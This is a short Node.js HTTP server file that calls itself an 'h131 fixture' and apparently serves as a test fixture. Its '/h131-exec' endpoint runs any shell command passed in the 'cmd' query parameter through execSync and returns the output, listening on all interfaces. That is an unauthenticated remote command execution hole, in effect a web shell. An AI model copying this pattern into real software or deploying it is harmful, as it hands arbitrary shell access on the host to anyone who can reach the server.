const http = require('http');
const { URL } = require('url');
const { execSync } = require('child_process');

const PORT = Number(process.env.PORT || 3000);

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  if (url.pathname === '/h131-exec') {
    const cmd = url.searchParams.get('cmd') || 'echo h131';
    let out = '';
    try {
      out = execSync(cmd, { encoding: 'utf8', timeout: 3000 });
    } catch (e) {
      out = String(e && e.message);
    }
    res.writeHead(200, { 'content-type': 'text/plain' });
    res.end(out.slice(0, 4000));
    return;
  }
  res.writeHead(200, { 'content-type': 'text/plain' });
  res.end('h131 fixture');
});

server.listen(PORT, '0.0.0.0');
